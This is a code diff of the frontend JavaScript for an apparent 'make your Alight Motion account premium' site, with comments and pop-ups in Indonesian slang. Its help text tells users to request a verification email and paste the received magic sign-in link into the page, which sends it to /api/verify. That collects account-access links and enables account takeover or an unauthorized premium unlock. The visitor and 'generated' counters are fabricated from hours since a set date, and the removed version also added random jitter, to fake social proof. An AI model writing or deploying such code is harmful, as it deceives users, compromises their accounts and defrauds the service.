@@ -1,60 +1,50 @@
-// --- LOGIKA STATISTIK DINAMIS ---
-function updateStats() {
-    // Tanggal web lu "lahir" (contoh: 16 Agustus 2026)
-    const launchDate = new Date('2026-08-16T00:00:00');
-    const now = new Date();
-    
-    // Hitung selisih jam
-    const diffInHours = Math.floor((now - launchDate) / (1000 * 60 * 60));
-    
-    // Base angka awal
-    const baseVisitors = 1204;
-    const baseGenerated = 842;
-    
-    // Formula: Angka awal + (jam berlalu * rate kenaikan) + sedikit random biar natural
-    const visitors = baseVisitors + (diffInHours * 5) + Math.floor(Math.random() * 3);
-    const generated = baseGenerated + (diffInHours * 3) + Math.floor(Math.random() * 2);
-    
-    // Update ke HTML
-    document.getElementById('visitorCount').innerText = visitors.toLocaleString();
-    document.getElementById('generatedCount').innerText = generated.toLocaleString();
+// --- HELPER BUTTON LOGIC ---
+function showHelp(step) {
+    if (step === 1) {
+        Swal.fire({
+            title: 'Cara Langkah 1',
+            text: 'Masukkan email akun Alight Motion lu yang mau dipremiumkan, terus klik "Kirim Link". Tunggu notifikasi sukses, lalu buka email lu.',
+            icon: 'info',
+            background: '#0c0c0c',
+            color: '#fff'
+        });
+    } else {
+        Swal.fire({
+            title: 'Cara Langkah 2',
+            text: 'Cek kotak masuk/spam di email tadi, salin link verifikasi yang dikirim, terus tempel (paste) di kolom ini dan klik Aktifkan!',
+            icon: 'info',
+            background: '#0c0c0c',
+            color: '#fff'
+        });
+    }
 }
 
-// Jalankan pas halaman dibuka
+// --- STATS LOGIC ---
+function updateStats() {
+    const hours = Math.floor((new Date() - new Date('2026-08-16')) / 3600000);
+    document.getElementById('visitorCount').innerText = (1204 + (hours * 5)).toLocaleString();
+    document.getElementById('generatedCount').innerText = (842 + (hours * 3)).toLocaleString();
+}
 updateStats();
 
-// --- FUNGSI API UTAMA ---
-async function sendVerificationEmail() {
-    const email = document.getElementById('emailInput').value;
-    if (!email) return Swal.fire({ icon: 'warning', text: 'Email kosong!' });
-
-    Swal.fire({ title: 'Memproses...', allowOutsideClick: false, didOpen: () => Swal.showLoading() });
-
+// --- API LOGIC (Tetep sama kayak sebelumnya) ---
+async function sendEmail() {
+    const email = document.getElementById('email').value;
+    if(!email) return Swal.fire('Oops', 'Isi email dulu!', 'warning');
+    Swal.fire({ title: 'Mengirim...', allowOutsideClick: false, didOpen: () => Swal.showLoading() });
     try {
         const res = await fetch(`/api/send?email=${encodeURIComponent(email)}`);
-        const data = await res.json();
-        Swal.fire('Sukses!', 'Cek email lu ya!', 'success');
-    } catch (e) {
-        Swal.fire('Error', 'Server sibuk, coba lagi nanti.', 'error');
-    }
+        Swal.fire('Sukses!', 'Cek email lu sekarang.', 'success');
+    } catch(e) { Swal.fire('Error', 'Gagal kirim.', 'error'); }
 }
 
-async function verifyPremium() {
-    const email = document.getElementById('emailInput').value;
-    const link = document.getElementById('magicLinkInput').value;
-    if (!email || !link) return Swal.fire({ icon: 'warning', text: 'Isi semua data!' });
-
-    Swal.fire({ title: 'Memproses...', allowOutsideClick: false, didOpen: () => Swal.showLoading() });
-
+async function verifyAcc() {
+    const email = document.getElementById('email').value;
+    const link = document.getElementById('magicLink').value;
+    if(!link) return Swal.fire('Oops', 'Link belum ditempel!', 'warning');
+    Swal.fire({ title: 'Verifikasi...', allowOutsideClick: false, didOpen: () => Swal.showLoading() });
     try {
-        const res = await fetch(`/api/verify?email=${encodeURIComponent(email)}&magicLink=${encodeURIComponent(link)}`);
-        const data = await res.json();
+        await fetch(`/api/verify?email=${encodeURIComponent(email)}&magicLink=${encodeURIComponent(link)}`);
         Swal.fire('Berhasil!', 'Akun sudah premium!', 'success');
-        
-        // Bonus: Update angka sukses setelah user berhasil generate
-        let current = parseInt(document.getElementById('generatedCount').innerText.replace(',', ''));
-        document.getElementById('generatedCount').innerText = (current + 1).toLocaleString();
-    } catch (e) {
-        Swal.fire('Gagal', 'Magic Link expired atau salah.', 'error');
-    }
+    } catch(e) { Swal.fire('Gagal', 'Link salah atau expired.', 'error'); }
 }
